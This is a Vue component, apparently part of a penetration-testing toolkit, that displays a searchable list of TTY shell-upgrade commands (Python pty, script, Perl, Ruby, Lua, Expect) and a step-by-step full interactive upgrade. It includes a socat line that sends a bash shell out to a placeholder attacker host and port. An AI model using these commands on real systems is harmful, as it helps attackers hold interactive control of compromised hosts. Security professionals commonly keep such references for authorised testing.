<template>
    <HeightResize v-slot="{ height }">
        <div :style="{ height: height + 'px' }" style="overflow: auto; padding: 5px;">
            <!-- 控制面板：分类筛选 + 搜索 -->
            <Display>
                <Align direction="vertical">
                    <Select
                        v-model="action.current.selectedCategory"
                        :label="$t('ttySpawn_category')"
                        :options="categoryOptions"
                    />
                    <Input
                        v-model="action.current.search"
                        :label="$t('ttySpawn_search')"
                        :placeholder="$t('ttySpawn_search_placeholder')"
                    />
                </Align>
            </Display>

            <!-- 结果统计 -->
            <div v-if="filteredGroups.length > 0" class="sectool-tty-count">
                {{ $t('ttySpawn_result_count', [filteredCommandCount]) }}
            </div>

            <!-- 按分类分组展示命令 -->
            <template v-for="group in filteredGroups" :key="group.category">
                <div class="sectool-tty-section-title">{{ group.category }}</div>
                <template v-for="cmd in group.commands" :key="cmd.id">
                    <Textarea
                        :model-value="cmd.command"
                        :height="42"
                        :placeholder="cmd.name"
                        :copy="cmd.name"
                    />
                </template>
            </template>

            <!-- 无匹配结果 -->
            <div v-if="filteredGroups.length === 0 && action.current.search" class="sectool-tty-empty">
                {{ $t('ttySpawn_empty') }}
            </div>

            <!-- 完整交互式 TTY 升级步骤 -->
            <div class="sectool-tty-section-title" style="margin-top: 10px;">
                {{ $t('ttySpawn_full_upgrade_title') }}
            </div>
            <div class="sectool-tty-upgrade-desc">
                {{ $t('ttySpawn_full_upgrade_desc') }}
            </div>
            <template v-for="(step, idx) in upgradeSteps" :key="'upgrade-' + idx">
                <div class="sectool-tty-step-label">
                    {{ $t('ttySpawn_step', [idx + 1]) }}: {{ $t('ttySpawn_' + step.descKey) }}
                </div>
                <Textarea
                    v-if="step.command"
                    :model-value="step.command"
                    :height="42"
                    :placeholder="'Step ' + (idx + 1)"
                    :copy="'Step ' + (idx + 1)"
                />
            </template>
        </div>
    </HeightResize>
</template>

<script lang="ts" setup>
import { useAction, initialize } from "@/store/action"

// ================ TTY Shell 生成命令数据 ================ //

interface TtyCommand {
    id: string
    name: string
    category: string
    command: string
}

const ttyCommands: TtyCommand[] = [
    // Python
    { id: "py1", name: "Python", category: "Python", command: "python -c 'import pty; pty.spawn(\"/bin/bash\")'" },
    { id: "py2", name: "Python3", category: "Python", command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
    // Script
    { id: "sc1", name: "Script (quiet)", category: "Script", command: "script -qc /bin/bash /dev/null" },
    { id: "sc2", name: "Script", category: "Script", command: "script /dev/null" },
    // Perl
    { id: "pl1", name: "Perl", category: "Perl", command: "perl -e 'exec \"/bin/bash\";'" },
    // Ruby
    { id: "rb1", name: "Ruby", category: "Ruby", command: "ruby -e 'exec \"/bin/bash\"'" },
    // Lua
    { id: "lu1", name: "Lua", category: "Lua", command: "lua -e \"os.execute('/bin/bash')\"" },
    // IRB（在 irb 交互式环境内执行）
    { id: "irb1", name: "IRB", category: "IRB", command: "exec \"/bin/bash\"" },
    // Expect
    { id: "ex1", name: "Expect", category: "Expect", command: "expect -c 'spawn /bin/bash; interact'" },
    // Socat（需要攻击端监听）
    { id: "so1", name: "Socat", category: "Socat", command: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT" },
]

// ================ 完整交互式升级步骤 ================ //

const upgradeSteps = [
    { descKey: "step1_desc", command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
    { descKey: "step2_desc", command: "" },
    { descKey: "step3_desc", command: "stty raw -echo; fg" },
    { descKey: "step4_desc", command: "export TERM=xterm" },
    { descKey: "step5_desc", command: "stty rows ROW cols COL" },
]

// ================ 分类下拉选项 ================ //

const categories = [...new Set(ttyCommands.map(c => c.category))]
const categoryOptions = [
    { value: "_all", label: "All" },
    ...categories.map(c => ({ value: c, label: c })),
]

// ================ 状态管理 ================ //

const action = useAction(await initialize({
    selectedCategory: "_all",
    search: "",
}))

// ================ 搜索与过滤 ================ //

interface TtyGroup {
    category: string
    commands: TtyCommand[]
}

const filteredGroups = $computed((): TtyGroup[] => {
    const keyword = (action.current.search || "").toLowerCase().trim()
    const catFilter = action.current.selectedCategory

    const filtered = ttyCommands.filter(cmd => {
        if (catFilter !== "_all" && cmd.category !== catFilter) return false
        if (keyword) {
            return cmd.name.toLowerCase().includes(keyword)
                || cmd.command.toLowerCase().includes(keyword)
                || cmd.category.toLowerCase().includes(keyword)
        }
        return true
    })

    // 按分类分组保持原始顺序
    const groupMap = new Map<string, TtyCommand[]>()
    for (const cmd of filtered) {
        if (!groupMap.has(cmd.category)) {
            groupMap.set(cmd.category, [])
        }
        groupMap.get(cmd.category)!.push(cmd)
    }

    return Array.from(groupMap.entries()).map(([category, commands]) => ({
        category,
        commands,
    }))
})

const filteredCommandCount = $computed(() => {
    return filteredGroups.reduce((sum, g) => sum + g.commands.length, 0)
})
</script>

<style scoped>
.sectool-tty-section-title {
    font-size: 12px;
    font-weight: 600;
    color: var(--sectool-text-secondary);
    margin: 8px 0 4px 2px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.sectool-tty-count {
    font-size: 11px;
    color: var(--sectool-text-tertiary);
    margin: 0 0 4px 2px;
}

.sectool-tty-empty {
    font-size: 12px;
    color: var(--sectool-text-tertiary);
    text-align: center;
    padding: 40px 0;
}

.sectool-tty-upgrade-desc {
    font-size: 11px;
    color: var(--sectool-text-tertiary);
    margin: 0 0 8px 2px;
    line-height: 1.4;
}

.sectool-tty-step-label {
    font-size: 11px;
    font-weight: 500;
    color: var(--sectool-text-secondary);
    margin: 6px 0 2px 2px;
}
</style>
